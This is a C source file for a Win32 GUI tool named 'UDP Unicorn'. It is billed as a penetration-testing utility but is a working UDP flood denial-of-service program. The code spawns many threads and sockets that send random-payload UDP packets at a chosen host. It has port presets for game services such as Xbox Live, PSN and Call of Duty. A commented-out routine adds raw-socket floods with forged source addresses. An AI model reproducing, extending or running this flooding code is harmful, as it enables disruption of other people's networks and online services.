/*
 *  A Win32 UDP flooding utility for penetration testing
 *  Copyright (C) 2011  unixunited@live.com
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "udpunicorn.h"

//------------------------------

extern BOOL g_bAttack;
extern unsigned long long g_nDataSent;

WSADATA wsadata;

//////////////////////////////////////////////////////////////////////////////

/* Set up a UDP socket with proper error handling */
static SOCKET setup_socket(void)
{
    SOCKET sock;

    if( ( sock = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP ) ) < 0 )
    {
        char buf[256] = {0};

        sprintf(buf, "socket() failed: %d", WSAGetLastError());
        err(buf);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

//////////////////////////////////////////////////////////////////////////////

/* Thread to send and receive an ICMP packet to the target */
static DWORD WINAPI _ping(LPVOID lpBuffer)
{
    #define terr(msg)\
    {\
        SetWindowText(hEditTest, msg);\
        closesocket(sockTest);\
        if(hIcmp) FreeLibrary(hIcmp);\
        if(hIp) CloseHandle(hIp);\
        WSACleanup();\
        ExitThread(0);\
    }

    HWND hwnd                   = (HWND) lpBuffer;
    HWND hEditTarget            = GetDlgItem(hwnd, IDC_EDT_TARGET),
         hEditTest              = GetDlgItem(hwnd, IDC_EDT_TEST);

    HINSTANCE   hIcmp           = LoadLibrary("ICMP.DLL");
    HANDLE      hIp             = INVALID_HANDLE_VALUE;
    SOCKET      sockTest        = INVALID_SOCKET;
    struct      data_t   data;
    struct      in_addr  hostaddr;
    char        szPingBuffer[32] = {0};
    DWORD       dwStatus        = 0;
    int         nLen = 0;

    // loads APIs
    typedef HANDLE      (WINAPI* pfnHV) (VOID);
    typedef DWORD       (WINAPI* pfnSE) (HANDLE, struct in_addr, LPVOID, WORD, PIP_OPTION_INFORMATION,
                                         LPVOID, DWORD, DWORD);

    pfnHV pIcmpCreateFile;
    pfnSE pIcmpSendEcho;

    pIcmpCreateFile      = (pfnHV) GetProcAddress(hIcmp, "IcmpCreateFile");
    pIcmpSendEcho        = (pfnSE) GetProcAddress(hIcmp, "IcmpSendEcho");

    // prepare the unicorn
    if( !start_winsock() )
        ExitThread(0);

    if(pIcmpCreateFile == 0 || pIcmpSendEcho == 0)
    {
        terr("Failed to load ICMP.DLL APIs");
    }

    memset(&data, 0, sizeof(struct data_t));

    // get unicorn data
    nLen = GetWindowTextLength(hEditTarget);
    if(nLen <= 0)
    {
        terr("Enter target");
    }
    GetWindowText(hEditTarget, data.ip, nLen + 1);

    if(hIcmp == 0)
    {
        terr("Unable to load icmp.dll");
    }

    // DNS on hostname
    if(!resolve_ip(data.ip))
    {
        terr("Invalid hostname");
    }

    // open ICMP service
    hIp = pIcmpCreateFile();
    if(hIp == INVALID_HANDLE_VALUE)
    {
        terr("Failed to open ICMP service");
    }

    // construct ICMP packet
    memset(szPingBuffer, '\xAA', sizeof(szPingBuffer));
    PIP_ECHO_REPLY pIpe = (PIP_ECHO_REPLY) GlobalAlloc(
                            GMEM_FIXED | GMEM_ZEROINIT,
                            sizeof(IP_ECHO_REPLY) + sizeof(szPingBuffer));
    if(pIpe == 0)
    {
        terr("Failed to allocate ping packet buffer");
    }

    pIpe->Data = szPingBuffer;
    pIpe->DataSize = sizeof(szPingBuffer);

    hostaddr.s_addr = inet_addr(data.ip);

    SetWindowText(hEditTest, "Sending ICMP request...");
    // send and receive ICMP packet
    dwStatus = pIcmpSendEcho(hIp, hostaddr,
                             szPingBuffer, sizeof(szPingBuffer), NULL,
                             pIpe, sizeof(IP_ECHO_REPLY) + sizeof(szPingBuffer), 5000);

    if(dwStatus)
    {
        char szBuffer[256] = {0};

        sprintf(szBuffer, "ECHO sent and received: %d ms",
                (int) pIpe->RoundTripTime);

        GlobalFree(pIpe);
        terr(szBuffer);
    }

    GlobalFree(pIpe);
    terr("No reply received from target");
}

//////////////////////////////////////////////////////////////////////////////

/* Resolve the IP address of hostname */
static DWORD WINAPI _dns(LPVOID lpBuffer)
{
    HWND hwnd = (HWND) lpBuffer;
    HWND hEditTarget        = GetDlgItem(hwnd, IDC_EDT_TARGET),
         hEditDNS           = GetDlgItem(hwnd, IDC_EDT_DNS);
    int nLen = 0;
    char szBuffer[256] = {0}, szResult[256] = {0};

    struct hostent* host;
    struct in_addr  in;

    // prepare the unicorn
    if( !start_winsock() )
        ExitThread(0);

    nLen = GetWindowTextLength(hEditTarget);
    if(nLen <= 0)
    {
        err("Enter target");
        WSACleanup();
        ExitThread(0);
    }
    else if(nLen > 255)
    {
        err("Host too large, seriously");
        WSACleanup();
        ExitThread(0);
    }
    GetWindowText(hEditTarget, szBuffer, nLen + 1);

    // get the host information
    host = gethostbyname(szBuffer);
    if(host == 0)
    {
        memset(szBuffer, 0, sizeof(szBuffer));
        sprintf(szBuffer, "Error resolving host: %d", WSAGetLastError());
        SetWindowText(hEditDNS, szBuffer);
        WSACleanup();
        ExitThread(0);
    }

    // acquire the IP address from the array(first element)
    in.s_addr = *(u_long*)host->h_addr_list[0];
    sprintf(szResult, "%s", inet_ntoa(in));
    SetWindowText(hEditDNS, szResult);

    WSACleanup();
    ExitThread(0);
}

//////////////////////////////////////////////////////////////////////////////

/* Construct UDP data, and send packets until user stops the attack */
static DWORD WINAPI _attack(LPVOID lpBuffer)
{
    extern HWND g_hDataSent;

    BOOL bRandPort = FALSE,
         bRandSize = FALSE;
    struct data_t* data;
    struct sockaddr_in hostaddr;
    struct sockaddr_in localaddr;
    struct hostent* localhost;
    struct in_addr localip;
    char* unicorn = 0; // data to send
    char szLocalhost[64] = {0};
    int i;

    data = (struct data_t*) lpBuffer;
    if(data->port == RAND_PORT)
        bRandPort = TRUE;

    if(data->size == RAND_SIZE)
        bRandSize = TRUE;

    SOCKET sock[data->sockets];

    #ifdef DEBUG
        char szBuffer[256] = {0};
        sprintf(szBuffer,
                "I'm attacking %s on port %d\n"
                "Size: %d\n"
                "Delay: %d\n"
                "Timeout: %d\n"
                "Sockets: %d",
                data->ip, data->port,
                data->size,
                data->delay,
                data->timeout,
                data->sockets);
        err(szBuffer);
    #endif

    unicorn = (char*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (bRandSize == TRUE) ? 66000 : data->size + 1);

    // give the unicorns their horns
    memset(&hostaddr, 0, sizeof(hostaddr));
    memset(&localaddr, 0, sizeof(localaddr));

    // find local unicorn IP address
    gethostname(szLocalhost, sizeof(szLocalhost));
    localhost = gethostbyname(szLocalhost);
    memcpy(&localip, localhost->h_addr_list[0], sizeof(struct in_addr));

    hostaddr.sin_family = AF_INET;
    if(!bRandPort)
        hostaddr.sin_port = htons(data->port);
    hostaddr.sin_addr.s_addr = inet_addr(data->ip);

    localaddr.sin_family = AF_INET;
    localaddr.sin_addr.s_addr = inet_addr( inet_ntoa( localip ) );
    localaddr.sin_port = htons( data->port );

    // equip the unicorns
    for(i=0; i<data->sockets; ++i)
        sock[i] = setup_socket();

    // polish unicorn's horns
    for(i=0; i<data->size; ++i)
        unicorn[i] = (char) (rand() % 255);

    // prepare the magic dust
    memset(unicorn, 0, sizeof(unicorn));

    while(g_bAttack)
    {
        char szBuffer[256] = {0};
        int nBytes = 0, i;

        // send UDP packets
        for(i=0; i<data->sockets; ++i)
        {
                if(bRandPort)
                    hostaddr.sin_port = ( rand() % 65535 );
                if(bRandSize)
                {
                    unsigned int j, nSize = 0;

                    nSize = rand() % 65000 + 999;

                    for(j=0; j<nSize; ++j)
                    {
                        unicorn[j] = (char) (rand() % 255);
                    }
                    unicorn[++j] = '\0';

                    while(nBytes < nSize)
                        nBytes = sendto(sock[i], unicorn, (nSize - (rand() % 10)), 0,
                                        (struct sockaddr*) &hostaddr, sizeof(hostaddr));
                }
                else
                    while(nBytes < data->size)
                        nBytes = sendto(sock[i], unicorn, (data->size - (rand() % 10)), 0,
                                        (struct sockaddr*) &hostaddr, sizeof(hostaddr));
        }

        Sleep(data->delay);

        // update data sent
        g_nDataSent += (nBytes / 1000); // convert kb
        sprintf(szBuffer, "%ld", g_nDataSent);
        SetWindowText(g_hDataSent, szBuffer);
    }

    for(i=0; i<data->sockets; ++i)
        closesocket(sock[i]);

    if(data) HeapFree(GetProcessHeap(), 0, data);
    HeapFree(GetProcessHeap(), 0, unicorn);
    ExitThread(0);
}

//////////////////////////////////////////////////////////////////////////////

/* pop up an error message box */
inline int err(const char* msg)
{
    return MessageBox(NULL, msg, 0, MB_ICONERROR);
}

//////////////////////////////////////////////////////////////////////////////

/* get the version of windows running */
int get_os_ver(void)
{
    OSVERSIONINFO lpVer;

    lpVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if(GetVersionEx(&lpVer))
    {
        if(lpVer.dwMajorVersion >= 6)
            return VER_LONGHORN;
        else if((lpVer.dwMajorVersion > 5 && lpVer.dwMajorVersion < 6)
                || (lpVer.dwMajorVersion == 5 && lpVer.dwMinorVersion == 1))
            return VER_XP;
        else
            return VER_NT;
    }

    return -1;
}

//////////////////////////////////////////////////////////////////////////////

/* resolve a hostname with DNS */
BOOL resolve_ip(char* hostname)
{
     struct hostent* host;
     struct in_addr  in;

     host = gethostbyname(hostname);
     if(host == 0)
        return FALSE;

     in.s_addr = *(u_long*)host->h_addr_list[0];
     strcpy(hostname, inet_ntoa(in));
     return TRUE;
}

//////////////////////////////////////////////////////////////////////////////

/* Make a call to WSAStartup() with error handling */
BOOL start_winsock(void)
{
    int nRes = 0;

    // prepare the unicorn
    nRes = WSAStartup(MAKEWORD( 2, 2 ), &wsadata);
    if(nRes != 0)
    {
        char buf[256];
        sprintf(buf, "WSAStartup() failed: %d", nRes);
        err(buf);
        WSACleanup();
        return FALSE;
    }

    return TRUE;
}

//////////////////////////////////////////////////////////////////////////////

/* Create a thread to ping the target */
void ping(HWND hwnd)
{
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_ping, hwnd, 0, 0);
}

//////////////////////////////////////////////////////////////////////////////

/* Create a thread to resolve the IP address of the hostname */
void dns(HWND hwnd)
{
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_dns, hwnd, 0, 0);
}

//////////////////////////////////////////////////////////////////////////////

/* Get user input from windows, and create the specified number of attack threads */
void setup_attack(HWND hwnd)
{
    HWND hEditTarget        = GetDlgItem(hwnd, IDC_EDT_TARGET),
         hEditPort          = GetDlgItem(hwnd, IDC_EDT_PORT),
         hEditSize          = GetDlgItem(hwnd, IDC_EDT_SIZE),
         hEditDelay         = GetDlgItem(hwnd, IDC_EDT_DELAY),
         hEditThreads       = GetDlgItem(hwnd, IDC_EDT_THREADS),
         hEditSockets       = GetDlgItem(hwnd, IDC_EDT_SOCKETS),
         hBtnTest           = GetDlgItem(hwnd, IDC_BTN_TEST),
         hBtnDNS            = GetDlgItem(hwnd, IDC_BTN_DNS),
         hBtnResetData      = GetDlgItem(hwnd, IDC_BTN_RESETDATA),
         hIcoLeftI          = GetDlgItem(hwnd, IDC_ICO_LEFTI),
         hIcoRightI         = GetDlgItem(hwnd, IDC_ICO_RIGHTI),
         hIcoLeftA          = GetDlgItem(hwnd, IDC_ICO_LEFTA),
         hIcoRightA         = GetDlgItem(hwnd, IDC_ICO_RIGHTA);

    struct  data_t* data    = 0;
    int     nLen            = 0,
            i;
    int     nThreads        = 0;
    BOOL    bDefPort        = FALSE;
    char    szBuffer[256]   = {0};

    // allocate unicorn
    data = (struct data_t*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DATA));

    // get all the unicorn data
    nLen = GetWindowTextLength(hEditTarget);
    if(nLen <= 0)
    {
        err("Enter target");
        return;
    }
    GetWindowText(hEditTarget, szBuffer, nLen + 1);
    sprintf(data->ip, szBuffer);

    nLen = GetWindowTextLength(hEditPort);
    if(nLen <= 0)
    {
        err("Enter port");
        return;
    }
    GetWindowText(hEditPort, szBuffer, nLen + 1);

    // check if this is unicorn worthy
    for(i=0; szBuffer[i] != '\0'; ++i)
    {
        if( !isdigit( szBuffer[i] ) )
        {
            data->port = (strcmp(szBuffer, "rand") == 0)    ? RAND_PORT
                        :(strcmp(szBuffer, _SSH) == 0)      ? SSH
                        :(strcmp(szBuffer, _TELNET) == 0)   ? TELNET
                        :(strcmp(szBuffer, _SMTP) == 0)     ? SMTP
                        :(strcmp(szBuffer, _DNS) == 0)      ? DNS
                        :(strcmp(szBuffer, _DHCP) == 0)     ? DHCP
                        :(strcmp(szBuffer, _HTTP) == 0)     ? HTTP
                        :(strcmp(szBuffer, _KERBEROS) == 0) ? KERBEROS
                        :(strcmp(szBuffer, _NETBIOS) == 0)  ? NETBIOS
                        :(strcmp(szBuffer, _IMAP4) == 0)    ? IMAP4
                        :(strcmp(szBuffer, _SNMP) == 0)     ? SNMP
                        :(strcmp(szBuffer, _LDAP) == 0)     ? LDAP
                        :(strcmp(szBuffer, _HTTPS) == 0)    ? HTTPS
                        :(strcmp(szBuffer, _RIP) == 0)      ? RIP
                        :(strcmp(szBuffer, _SFTP_SSL) == 0) ? SFTP_SSL
                        :(strcmp(szBuffer, _MS_SQL) == 0)   ? MS_SQL
                        :(strcmp(szBuffer, _MSN) == 0)      ? MSN
                        :(strcmp(szBuffer, _MYSQL) == 0)    ? MYSQL
                        :(strcmp(szBuffer, _ITUNES) == 0)   ? ITUNES
                        :(strcmp(szBuffer, _VENT) == 0)     ? VENT
                        :(strcmp(szBuffer, _ICQ) == 0)      ? ICQ
                        :(strcmp(szBuffer, _AOL) == 0)      ? AOL
                        :(strcmp(szBuffer, _XFIRE) == 0)    ? XFIRE
                        :(strcmp(szBuffer, _XBOX_LIVE) == 0)? XBOX_LIVE
                        :(strcmp(szBuffer, _PSN) == 0)      ? PSN
                        :(strcmp(szBuffer, _COD) == 0)      ? COD
                        :(strcmp(szBuffer, _MW2) == 0)      ? MW2
                        :(strcmp(szBuffer, _CSTRIKE) == 0)  ? CSTRIKE
                        :(strcmp(szBuffer, _MC) == 0)       ? MC
                        :(strcmp(szBuffer, _TF2) == 0)      ? TF2
                        :(strcmp(szBuffer, _WOW) == 0)      ? WOW
                        :(strcmp(szBuffer, _LOL) == 0)      ? LOL
                        : -1;

            bDefPort = TRUE;

            if(data->port == -1)
            {
                err("Enter a valid port (enter \"rand\" for random)");
                return;
            }
        }
    }

    if(!bDefPort)
        data->port = atoi(szBuffer);

    DWORD dwPos = SendMessage(GetDlgItem(hwnd, IDC_TB_SIZE), TBM_GETPOS, 0, 0);
    float nBuffer = dwPos;

    szBuffer[0] = '\0';
    sprintf(szBuffer, "%0.1f", nBuffer);
    SetWindowText(hEditSize, szBuffer);

    nLen = GetWindowTextLength(hEditSize);
    if(nLen <= 0) // should never happen
    {
        err("You broke it");
        return;
    }
    GetWindowText(hEditSize, szBuffer, nLen + 1);
    data->size = atoi(szBuffer);
    data->size *= 1000; // convert to bytes

    // check for random size
    if( IsDlgButtonChecked( hwnd, IDC_CHK_RANDSIZE ) )
        data->size = RAND_SIZE;

    // get delay
    nLen = GetWindowTextLength(hEditDelay);
    if(nLen <= 0)
    {
        err("Enter delay");
        return;
    }
    GetWindowText(hEditDelay, szBuffer, nLen + 1);
    data->delay = atoi(szBuffer);

    // get number of threads
    nLen = GetWindowTextLength(hEditThreads);
    if(nLen <= 0)
    {
        err("Enter number of threads");
        return;
    }
    GetWindowText(hEditThreads, szBuffer, nLen + 1);
    nThreads = atoi(szBuffer);

    // get number of sockets per thread
    nLen = GetWindowTextLength(hEditSockets);
    if(nLen <= 0)
    {
        err("Enter number of sockets per thread");
        return;
    }
    GetWindowText(hEditSockets, szBuffer, nLen + 1);
    data->sockets = atoi(szBuffer);

    // prepare the unicorn
    if( !start_winsock() )
        return;

    // check the target
    if(!resolve_ip(data->ip))
    {
        err("Invalid hostname");
        WSACleanup();
        return;
    }

    for(i=0; i<nThreads; ++i)
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_attack, data, 0, 0);

    // Show attack mode
    SetWindowText(GetDlgItem(hwnd, IDC_BTN_ATTACK), "Stop Unicorns");
    ShowWindow(hIcoLeftI, FALSE);
    ShowWindow(hIcoRightI, FALSE);
    ShowWindow(hIcoLeftA, TRUE);
    ShowWindow(hIcoRightA, TRUE);
    EnableWindow(hBtnTest, FALSE);
    EnableWindow(hBtnDNS, FALSE);
    EnableWindow(hBtnResetData, FALSE);
}

//////////////////////////////////////////////////////////////////////////////

/* This is just here for the hell of it,
    it doesn't work on Windows greater than XP SP1 due to raw sockets,
    but just incase it is ever allowed again... */
/*
DWORD WINAPI _forged_attack(LPVOID lpBuffer)
{
    extern HWND g_hDataSent;
    BOOL bRandPort = FALSE;
    BOOL bRandSrc = FALSE;
    PDATA data;
    struct ip iphdr;
    struct udphdr udphdr;
    struct sockaddr_in hostaddr;
    struct sockaddr_in localaddr;
    struct hostent* localhost;
    struct in_addr localip;
    char* unicorn = NULL, szBuffer[256] = {0}; // data to send
    char szLocalhost[64] = {0};
    int i;

    srand(time(0));

    data = (PDATA) lpBuffer;

    if(data->port == -1)
        bRandPort = TRUE;

    // check random source

    SOCKET sock[data->size];

    unicorn = (char*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, data->size + 1);

    // give the unicorns their horns
    memset(&hostaddr, 0, sizeof(hostaddr));
    memset(&localaddr, 0, sizeof(localaddr));

    // find local unicorn IP address
    gethostname(szLocalhost, sizeof(szLocalhost));
    localhost = gethostbyname(szLocalhost);
    memcpy(&localip, localhost->h_addr_list[0], sizeof(struct in_addr));

    hostaddr.sin_family = AF_INET;
    if(!bRandPort)
        hostaddr.sin_port = htons(data->port);
    hostaddr.sin_addr.s_addr = inet_addr(data->ip);

    localaddr.sin_family = AF_INET;
    localaddr.sin_addr.s_addr = inet_addr( inet_ntoa( localip ) );
    localaddr.sin_port = htons( g_nPort + ( rand() % 65279 ) );
    ++g_nPort;

    for(i=0; i<data->sockets; ++i)
    {
        if( sock[i] = socket(PF_INET, SOCK_RAW, IPPROTO_RAW) < 0)
        {
            char buf[256] = {0};

            sprintf(buf, "socket() failed: %d", WSAGetLastError());
            err(buf);
            ExitThread(0);
        }

    }

    for(i=0; i<data->size; ++i)
    {
        unicorn[i] = (char) (rand() % 255);
    }

    // fill header structures
    iphdr.ip_hl     = 5;
    iphdr.ip_v      = 4;
    iphdr.ip_tos    = 0x0;
    iphdr.ip_id     = htons(1);
    iphdr.ip_off    = 0;
    iphdr.ip_ttl    = 64;
    iphdr.ip_p      = IPPROTO_UDP;
    memcpy((char*) &iphdr.ip_dst.s_addr, &hostaddr.sin_addr.s_addr, sizeof(hostaddr.sin_addr.s_addr));
    iphdr.ip_sum    = checksum((unsigned short*) &iphdr, sizeof(iphdr));
    iphdr.ip_sum    = 0;
    iphdr.ip_len    = htons(sizeof(iphdr) + sizeof(udphdr) + data->size);
    iphdr.ip_src.s_addr = inet_addr(data->src_ip);

    udphdr.uh_sum   = 0;
    udphdr.uh_ulen  = htons(sizeof(udphdr) + data->size);
    udphdr.uh_dport = hostaddr.sin_port;
    if(bRandPort)
        udphdr.uh_sport = htons( rand() % 65535 );
    else
        udphdr.uh_sport = hostaddr.sin_port;

    // construct packet
    memcpy(szBuffer, &iphdr, sizeof(iphdr));
    unicorn = &szBuffer[sizeof(iphdr)];
    memcpy(szBuffer, &udphdr, sizeof(udphdr));
    unicorn = &szBuffer[sizeof(iphdr) + sizeof(udphdr)];

    while(g_bAttack)
    {
        int nBytes = 0;
        char szBuffer[256] = {0};

        if(bRandPort)
        {
            udphdr.uh_dport = htons( rand() % 65535 );
        }
        if(bRandSrc)
        {
            iphdr.ip_src.s_addr = rand();
            memcpy(unicorn, &iphdr, sizeof(iphdr));
        }

        for(i=0; i<data->sockets; ++i)
        nBytes = sendto(sock[i], unicorn, (data->size) - (rand() % 10), 0,
                    (struct sockaddr*) &hostaddr, sizeof(hostaddr));

        // update data sent
        g_nDataSent += (nBytes / 1000); // convert kb
        sprintf(szBuffer, "%d", g_nDataSent);
        SetWindowText(g_hDataSent, szBuffer);
    }

    for(i=0; i<data->sockets; ++i)
        closesocket(sock[i]);
    HeapFree(GetProcessHeap(), 0, unicorn);
    ExitThread(0);
}

unsigned short checksum(unsigned short *buf, int nWords)
{
        unsigned long sum;

        for(sum=0; nWords>0; --nWords)
                sum += *buf++;

        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);

        return (unsigned short)(~sum);
}
*/


